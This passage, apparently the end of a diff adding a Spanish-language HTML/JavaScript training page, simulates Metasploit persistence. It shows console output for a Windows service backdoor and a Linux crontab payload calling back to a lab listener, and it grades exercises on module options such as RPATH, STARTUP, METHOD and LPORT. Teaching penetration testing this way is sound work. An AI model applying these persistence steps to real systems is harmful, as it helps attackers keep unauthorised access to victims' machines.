+[+] Service 'MetSvc' created successfully.
+[+] Persistence has been established!
+[*] Payload written to C:\\Windows\\Temp\\backdoor.exe
+[*] Rebooting target...
+            `.trim();
+            typeWriter('win-demo-step2-output', output);
+        }
+
+        function runDemoStep3Windows() {
+            const output = `
+meterpreter > shutdown -r
+[*] Shutting down TARGET-PC in 60 seconds...
+
+[!] Meterpreter session 1 closed.  Reason: Died
+            `.trim();
+            typeWriter('win-demo-step3-output', output);
+        }
+
+        function runDemoStep4Windows() {
+            const output = `
+msf6 > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information           Connection
+  --  ----  ----                     -----------           ----------
+  1         meterpreter x64/windows  TARGET-PC\\User @ TARGET-PC  192.168.1.100:4444 -> 192.168.1.101:49152 (192.168.1.101)
+  2         meterpreter x64/windows  TARGET-PC\\User @ TARGET-PC  192.168.1.100:4444 -> 192.168.1.101:49153 (192.168.1.101) (NEW PERSISTENT SESSION)
+            `.trim();
+            typeWriter('win-demo-step4-output', output);
+        }
+
+        function runDemoStep1Linux() {
+            const output = `
+msf6 > sessions -i 2
+
+[*] Starting interaction with 2...
+
+meterpreter > sysinfo
+Computer        : kali-target
+OS              : Linux kali-target 5.10.0-kali7-amd64 #1 SMP Debian 5.10.46-4kali1 (2021-08-09) x86_64
+Architecture    : x64
+System Language : en_US
+Meterpreter     : x64/linux
+            `.trim();
+            typeWriter('linux-demo-step1-output', output);
+        }
+
+        function runDemoStep2Linux() {
+            const output = `
+msf6 post(linux/manage/persistence) > run
+
+[*] Running module against kali-target
+[*] Generating payload...
+[*] Writing payload to /tmp/.Zc22lF...
+[+] Payload successfully written to /tmp/.Zc22lF
+[*] Setting up Crontab persistence...
+[+] Crontab entry added for user kali for payload /tmp/.Zc22lF connecting to 192.168.1.100:4445
+[*] Persistence has been established via Crontab!
+            `.trim();
+            typeWriter('linux-demo-step2-output', output);
+        }
+
+        function runDemoStep3Linux() {
+            const output = `
+meterpreter > shell
+Process 1523 created.
+Channel 1 created.
+kali@kali-target:~$ cat /var/spool/cron/crontabs/kali
+# DO NOT EDIT THIS FILE - edit the master and reinstall.
+# (/tmp/crontab.uDqG4g installed on Mon Jul  7 17:00:00 2025)
+# (Cronie version 3.0.0 on Debian 11)
+* * * * * /tmp/.Zc22lF >/dev/null 2>&1 &
+kali@kali-target:~$ sudo reboot
+
+[!] Meterpreter session 2 closed.  Reason: Died
+            `.trim();
+            typeWriter('linux-demo-step3-output', output);
+        }
+
+        function runDemoStep4Linux() {
+            const output = `
+msf6 > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information           Connection
+  --  ----  ----                     -----------           ----------
+  1         meterpreter x64/windows  TARGET-PC\\User @ TARGET-PC  192.168.1.100:4444 -> 192.168.1.101:49152 (192.168.1.101)
+  2         meterpreter x64/linux    kali@kali-target      192.168.1.100:4445 -> 192.168.1.102:45678 (192.168.1.102) (NEW PERSISTENT SESSION)
+            `.trim();
+            typeWriter('linux-demo-step4-output', output);
+        }
+
+        // Ejecutar las simulaciones cuando la sección de demostración esté activa
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    if (entry.target.id === 'windows-demo') {
+                        runDemoStep1Windows();
+                        setTimeout(runDemoStep2Windows, 5000); // simulate delay
+                        setTimeout(runDemoStep3Windows, 10000);
+                        setTimeout(runDemoStep4Windows, 15000);
+                    } else if (entry.target.id === 'linux-demo') {
+                        runDemoStep1Linux();
+                        setTimeout(runDemoStep2Linux, 5000);
+                        setTimeout(runDemoStep3Linux, 10000);
+                        setTimeout(runDemoStep4Linux, 15000);
+                    }
+                }
+            });
+        }, { threshold: 0.5 }); // Adjust threshold as needed
+
+        sections.forEach(section => {
+            if (section.id === 'windows-demo' || section.id === 'linux-demo') {
+                observer.observe(section);
+            }
+        });
+
+
+        // Lógica de los ejercicios
+        function checkWindowsExercise() {
+            const q1Answer = document.getElementById('win-exercise-q1').value.trim().toLowerCase();
+            const q2Answer = document.getElementById('win-exercise-q2').value.trim().toLowerCase();
+
+            const feedback1 = document.getElementById('win-exercise-feedback1');
+            const feedback2 = document.getElementById('win-exercise-feedback2');
+
+            feedback1.style.display = 'block';
+            if (q1Answer.includes('set rpath c:\\programdata\\') || q1Answer.includes('set rpath c:/programdata/')) {
+                feedback1.className = 'feedback correct';
+                feedback1.textContent = 'Correcto! La ruta C:\\ProgramData\\ es una buena elección para un payload.';
+            } else {
+                feedback1.className = 'feedback incorrect';
+                feedback1.textContent = 'Incorrecto. Revisa la documentación del módulo o las técnicas de Windows. La respuesta esperada es "set RPATH C:\\ProgramData\\"';
+            }
+
+            feedback2.style.display = 'block';
+            if (q2Answer.includes('set startup r') || q2Answer.includes('set startup "r"')) {
+                feedback2.className = 'feedback correct';
+                feedback2.textContent = 'Correcto! "R" indica el uso de las claves de registro Run.';
+            } else {
+                feedback2.className = 'feedback incorrect';
+                feedback2.textContent = 'Incorrecto. "R" se usa para la persistencia en el registro Run. Revisa la sección de módulos de Metasploit.';
+            }
+        }
+
+        function checkLinuxExercise() {
+            const q1Answer = document.getElementById('linux-exercise-q1').value.trim().toLowerCase();
+            const q2Answer = document.getElementById('linux-exercise-q2').value.trim().toLowerCase();
+
+            const feedback1 = document.getElementById('linux-exercise-feedback1');
+            const feedback2 = document.getElementById('linux-exercise-feedback2');
+
+            feedback1.style.display = 'block';
+            if (q1Answer.includes('set method crontab')) {
+                feedback1.className = 'feedback correct';
+                feedback1.textContent = 'Correcto! "CRONTAB" es el método para usar Crontab.';
+            } else {
+                feedback1.className = 'feedback incorrect';
+                feedback1.textContent = 'Incorrecto. Para Crontab, el valor de METHOD es "CRONTAB".';
+            }
+
+            feedback2.style.display = 'block';
+            if (q2Answer.includes('set lport 4446')) {
+                feedback2.className = 'feedback correct';
+                feedback2.textContent = 'Correcto! "set LPORT 4446" configura el puerto de escucha del payload.';
+            } else {
+                feedback2.className = 'feedback incorrect';
+                feedback2.textContent = 'Incorrecto. Necesitas usar "set LPORT 4446" para especificar el puerto de escucha.';
+            }
+        }
+
+        // Mostrar la primera sección al cargar
+        document.addEventListener('DOMContentLoaded', () => {
+            showSection(0);
+        });
+    </script>
+</body>
+</html>
